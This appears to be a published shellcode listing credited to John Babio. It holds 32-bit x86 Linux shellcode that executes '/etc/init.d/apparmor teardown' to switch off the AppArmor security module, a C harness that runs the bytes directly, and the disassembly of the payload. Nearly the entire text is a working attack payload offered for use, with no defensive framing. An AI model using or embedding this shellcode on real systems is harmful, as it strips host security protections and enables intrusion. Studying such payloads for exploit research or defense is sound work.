Name = John Babio
Twitter = 3vi1john

/etc/init.d/apparmor teardown

const char sc[] = "\x6a\x0b\x58\x31\xd2\x52\x68\x64\x6f\x77\x6e\x68\x74\x65\x61\x72\x89\xe1"
"\x52\x68\x72\x6d\x6f\x72\x68\x61\x70\x70\x61\x68\x74\x2e\x64\x2f\x68\x2f\x69\x6e\x69\x68\x2f"
"\x65\x74\x63\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

main(){
      int (*shell)();
      shell=sc;
      shell();
    }

08048060 <_start>:
 8048060:    6a 0b                    push   $0xb
 8048062:    58                       pop    %eax
 8048063:    31 d2                    xor    %edx,%edx
 8048065:    52                       push   %edx
 8048066:    68 64 6f 77 6e           push   $0x6e776f64
 804806b:    68 74 65 61 72           push   $0x72616574
 8048070:    89 e1                    mov    %esp,%ecx
 8048072:    52                       push   %edx
 8048073:    68 72 6d 6f 72           push   $0x726f6d72
 8048078:    68 61 70 70 61           push   $0x61707061
 804807d:    68 74 2e 64 2f           push   $0x2f642e74
 8048082:    68 2f 69 6e 69           push   $0x696e692f
 8048087:    68 2f 65 74 63           push   $0x6374652f
 804808c:    89 e3                    mov    %esp,%ebx
 804808e:    52                       push   %edx
 804808f:    51                       push   %ecx
 8048090:    53                       push   %ebx
 8048091:    89 e1                    mov    %esp,%ecx
 8048093:    cd 80                    int    $0x80